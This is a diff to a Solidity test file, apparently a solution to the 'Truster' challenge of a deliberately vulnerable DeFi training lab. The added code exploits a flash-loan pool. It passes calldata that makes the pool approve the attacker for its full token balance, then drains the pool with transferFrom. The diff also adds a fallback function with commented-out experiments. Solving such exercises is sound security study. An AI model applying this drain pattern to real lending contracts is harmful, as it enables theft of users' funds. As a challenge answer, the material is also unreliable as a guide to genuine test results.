@@ -41,7 +41,12 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        // call flash loan and set to appove all the balance to the attacker and then transfer everything out!
+        bytes memory approveAll = abi.encodeWithSignature("approve(address,uint256)", attacker, TOKENS_IN_POOL);
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), approveAll);
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -53,5 +58,11 @@ contract Truster is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
+    }
+
+    fallback() external {
+        console.log("FALLBACK CALLED!");
+        // bytes memory fallbackFn = abi.encodeWithSignature("doesNotExist()", 100);
+        // trusterLenderPool.flashLoan(TOKENS_IN_POOL, attacker, address(trusterLenderPool), fallbackFn);
     }
 }
